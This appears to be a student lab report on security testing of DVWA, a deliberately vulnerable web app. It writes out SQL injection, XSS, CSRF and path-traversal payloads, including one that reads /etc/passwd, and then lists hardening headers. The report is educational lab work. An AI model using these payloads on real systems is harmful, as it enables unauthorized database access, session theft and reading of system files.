# 🔐 Security Testing Report

### Web Application Security Testing using DVWA

---

## 🎯 Objective

To identify, exploit, and analyze common web application vulnerabilities and understand their mitigation techniques.

---

## 🛠️ Tools Used

- Kali Linux
- DVWA
- Burp Suite
- Apache2
- MySQL/MariaDB

---

## 🔍 1. SQL Injection

## Payloads

```sql
1' OR '1'='1
```

<img width="1919" height="884" alt="Screenshot 2026-04-26 230859" src="https://github.com/user-attachments/assets/7b27aa9b-06e7-48a6-9a5f-4e6c4864d983" />

---

```sql
1' UNION SELECT user, password FROM users#
```

<img width="1915" height="881" alt="Screenshot 2026-04-26 230843" src="https://github.com/user-attachments/assets/6c5b044d-0eb0-46c9-872e-5d30060e4b00" />

---

## Description

SQL Injection allows attackers to manipulate backend database queries through unsanitized user input.

## Impact

- Authentication bypass
- Database compromise
- Data leakage

---

## 🌐 2. Cross-Site Scripting (XSS)

## Stored XSS

```html
<script>alert('XSS')</script>
```

<img width="1908" height="752" alt="image" src="https://github.com/user-attachments/assets/15f148cf-5e6f-46dd-a6ba-6e5d96870f3b" />

---

## Reflected XSS

```html
<script>alert('Reflected XSS')</script>
```

<img width="1916" height="868" alt="image" src="https://github.com/user-attachments/assets/1d26f94b-e024-437c-98f4-f378302df145" />

---

## Description

XSS vulnerabilities allow attackers to execute malicious JavaScript in the victim’s browser.

## Impact

- Session hijacking
- Cookie theft
- Browser manipulation

---

## 🔁 3. CSRF

## Payload

```html
<script>
window.location="http://localhost/dvwa/vulnerabilities/csrf/?password_new=password123&password_conf=password123&Change=Change";
</script>
```

<img width="898" height="766" alt="image" src="https://github.com/user-attachments/assets/a4853be0-be8d-4c05-853d-58430b32ec27" />

---

## Description

CSRF exploits authenticated sessions to force users into unintended actions.

## Impact

- Unauthorized actions
- Password manipulation

---

## 📂 4. File Inclusion

## Payload

```text
?page=../../../../etc/passwd
```

<img width="1916" height="838" alt="image" src="https://github.com/user-attachments/assets/8e9fcc6f-23cd-4def-980d-eef9249c4b1b" />

---

## Description

LFI vulnerabilities allow unauthorized access to local system files.

## Impact

- Sensitive data disclosure
- Server information leakage

---

## 🛰️ 5. Burp Suite Testing

## Activities Performed

- Request interception
- Request modification
- Intruder brute-force testing

---

<img width="1918" height="915" alt="image" src="https://github.com/user-attachments/assets/7c6b5ca5-eb5e-455e-8d70-71d7f5059a1b" />

---

## 🛡️ 6. Security Headers

## Configured Headers

```apache
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "DENY"
Header set X-XSS-Protection "1; mode=block"
```

<img width="1077" height="712" alt="image" src="https://github.com/user-attachments/assets/2a49ea87-8507-4adf-9837-99135ae24e2e" />

---

## ✅ Conclusion

The experiment successfully demonstrated common web vulnerabilities and their exploitation techniques using DVWA. Proper security controls and secure coding practices are necessary to protect modern web applications.
